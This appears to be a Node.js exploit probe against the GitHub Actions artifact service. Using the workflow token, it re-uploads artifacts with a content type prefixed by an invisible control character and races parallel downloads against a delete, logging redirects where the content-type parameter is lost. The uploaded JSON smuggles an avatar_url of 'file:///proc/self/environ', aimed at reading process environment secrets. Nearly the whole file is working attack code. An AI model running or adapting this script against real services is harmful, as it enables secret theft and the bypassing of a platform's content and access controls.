import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids=getBackendIdsFromToken(); const client=internalArtifactTwirpClient({maxAttempts:1});
const repo=process.env.GITHUB_REPOSITORY, runId=process.env.GITHUB_RUN_ID, token=process.env.GITHUB_TOKEN;
const odd='\u0085application/json';
const body=Buffer.from(JSON.stringify({full_name:`${repo}/x`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'delrace',stargazers_count:0}));
const sha=b=>createHash('sha256').update(b).digest('hex');
function req(url,method='GET',body=null,headers={}){return new Promise((resolve,reject)=>{const t=new URL(url);const mod=t.protocol==='https:'?https:http;
  const r=mod.request(t,{method,headers,timeout:20000},res=>{const c=[];res.on('data',x=>c.push(x));res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,body:Buffer.concat(c)}));});
  r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));if(body)r.write(body);r.end();});}
async function upload(url,bytes,ct){const b=new BlobClient(url).getBlockBlobClient();await b.uploadData(bytes,{blobHTTPHeaders:{blobContentType:ct}});}
const ANOM=[];
for(let trial=0;trial<25;trial++){
  const name=`dr-${runId}-${trial}`;
  try{
    const c=await client.CreateArtifact({...ids,name,version:7,mimeType:StringValue.create({value:'application/json'})});
    if(!c.ok){continue;}
    const ph=Buffer.from('{}');
    await upload(c.signedUploadUrl,ph,odd);
    const f=await client.FinalizeArtifact({...ids,name,size:String(ph.length),hash:StringValue.create({value:`sha256:${sha(ph)}`})});
    if(!f.ok){continue;}
    const id=String(f.artifactId);
    await upload(c.signedUploadUrl,body,odd);
    // race: many downloads + delete
    const dl=()=>req(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'delrace'});
    const del=()=>client.DeleteArtifact({...ids,name});
    const downloads=[]; for(let k=0;k<8;k++){downloads.push(dl());}
    const delp=del();
    const results=await Promise.allSettled([...downloads,delp]);
    for(const r of results){
      if(r.status!=='fulfilled')continue;
      const v=r.value;
      if(!v||v.status===undefined)continue;
      if(v.status===302&&v.headers&&v.headers.location){
        const u=new URL(v.headers.location);
        const rsct=u.searchParams.get('rsct');
        if(!u.searchParams.has('rsct')||rsct!=='application/json'){
          let finalCt=null, match=null, fst=null;
          try{const fr=await req(u.href);finalCt=fr.headers['content-type'];match=fr.body.equals(body);fst=fr.status;}catch{}
          ANOM.push({trial,rsct,hasRsct:u.searchParams.has('rsct'),finalCt,match,fst,loc:u.href.slice(0,180)});
        }
      }
    }
  }catch(e){ANOM.push({trial,err:String(e.message).slice(0,160)});}
}
console.log('DELRACE',JSON.stringify({anomalies:ANOM.slice(0,10),count:ANOM.length,trials:25}));
